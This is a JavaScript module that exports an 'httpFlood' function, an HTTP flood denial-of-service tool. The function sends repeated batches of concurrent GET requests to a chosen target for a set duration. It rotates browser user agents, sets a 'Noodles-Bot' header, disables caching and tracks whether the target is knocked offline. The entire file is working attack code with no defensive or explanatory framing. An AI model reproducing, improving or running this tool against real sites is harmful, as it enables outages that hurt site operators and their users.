async function httpFlood(target, duration, intensity, updateStatsCallback) {
  let packetsSent = 0;
  let targetStatus = 'Online';
  let mbps = 0;
  const startTime = Date.now();
  let timeoutId;
  let controller = new AbortController();
  let running = true;

  try {
    const url = new URL(target);
    const host = url.hostname;

    const interval = Math.max(1, 50 / intensity);

    const userAgents = [
      'Noodles-Bot v3.1',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.77',
    ];

    timeoutId = setTimeout(() => {
      controller.abort();
      targetStatus = 'Timeout';
      running = false;
      updateStatsCallback({
        packetsSent,
        targetStatus,
        mbps: mbps.toFixed(2),
        elapsedTime: ((Date.now() - startTime) / 1000).toFixed(2)
      });
    }, duration * 1000);

    async function sendRequest() {
      if (!running || controller.signal.aborted) return;

      const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

      try {
        const response = await fetch(target, {
          method: 'GET',
          headers: {
            'User-Agent': userAgent,
            'X-Noodles-Bot': 'Active',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive'
          },
          mode: 'no-cors',
          signal: controller.signal,
        });

        packetsSent++;
        if (response.ok) {
          const contentLength = response.headers.get('content-length');
          if (contentLength) {
            mbps += parseFloat(contentLength) / 1000000;
          }
          targetStatus = 'Online';
        } else {
          targetStatus = 'Unresponsive';
          console.warn(`Request failed with status: ${response.status}`);
        }
      } catch (error) {
        if (error.name === 'AbortError') {
        } else {
          targetStatus = 'Offline';
          console.warn("Request failed:", error);
        }
      } finally {
        const elapsedTime = (Date.now() - startTime) / 1000;
        const currentMbps = (mbps * 8) / elapsedTime;
        if (updateStatsCallback) {
          updateStatsCallback({
            packetsSent,
            targetStatus,
            mbps: currentMbps.toFixed(2),
            elapsedTime: elapsedTime.toFixed(2)
          });
        }
      }
    }

    async function attackLoop() {
      while (running && Date.now() - startTime < duration * 1000) {
        const promises = [];
        for (let i = 0; i < intensity; i++) {
          promises.push(sendRequest());
        }
        await Promise.all(promises);
        await new Promise(resolve => setTimeout(resolve, interval));
      }
    }

    await attackLoop();

  } catch (error) {
    console.error("Error in httpFlood:", error);
    targetStatus = 'Offline';
  } finally {
    clearTimeout(timeoutId);
    controller.abort();
    running = false;
    const elapsedTime = (Date.now() - startTime) / 1000;
    const currentMbps = (mbps * 8) / elapsedTime;
    if (updateStatsCallback) {
      updateStatsCallback({
        packetsSent,
        targetStatus,
        mbps: currentMbps.toFixed(2),
        elapsedTime: elapsedTime.toFixed(2)
      });
    }
    console.log("HTTP Flood completed.");
  }
  return { packetsSent, targetStatus, mbps };
}

module.exports = { httpFlood };